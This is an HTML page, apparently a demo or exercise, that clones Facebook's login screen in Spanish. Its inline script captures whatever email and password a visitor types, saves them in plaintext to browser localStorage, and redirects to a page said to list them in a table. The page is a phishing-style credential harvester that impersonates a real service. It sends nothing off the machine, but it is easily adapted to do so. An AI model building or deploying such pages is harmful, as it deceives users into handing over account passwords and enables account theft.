<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login de Facebook</title>
    <link rel="stylesheet" href="css/estilos.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>Facebook</h1>
            <form action="#">
                <div class="input-group">
                    <input type="text" placeholder="Correo electrónico o teléfono" id="emailInput" required>
                </div>
                <div class="input-group">
                    <input type="password" placeholder="Contraseña" id="passwordInput" required>
                </div>
                <button type="submit" id="loginButton" class="login-btn">Iniciar sesión</button>
                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
            </form>
            <div class="divider"></div>
            <button class="create-account-btn">Crear cuenta nueva</button>
        </div>
    </div>
    <script>
      // Obtener referencias a los elementos HTML
        var emailInput = document.getElementById("emailInput");
        var passwordInput = document.getElementById("passwordInput");
        var loginButton = document.getElementById("loginButton");
  
        // Agregar evento de clic al botón de inicio de sesión
        loginButton.addEventListener("click", function(event) {
          event.preventDefault();
  
          // Obtener los valores de correo electrónico y contraseña
          var email = emailInput.value;
          var password = passwordInput.value;
  
          // Crear un objeto de usuario
          var user = {
            email: email,
            password: password
          };
  
          // Obtener los datos de usuarios existentes del almacenamiento local o crear un nuevo arreglo si no hay datos
          var users = JSON.parse(localStorage.getItem("users")) || [];
  
          // Agregar el nuevo usuario al arreglo
          users.push(user);
  
          // Guardar los datos de usuarios actualizados en el almacenamiento local
          localStorage.setItem("users", JSON.stringify(users));
  
          // Redirigir a la página que muestra los datos en una tabla
          window.location.href = "index.html";
        });
      </script>
</body>
</html>
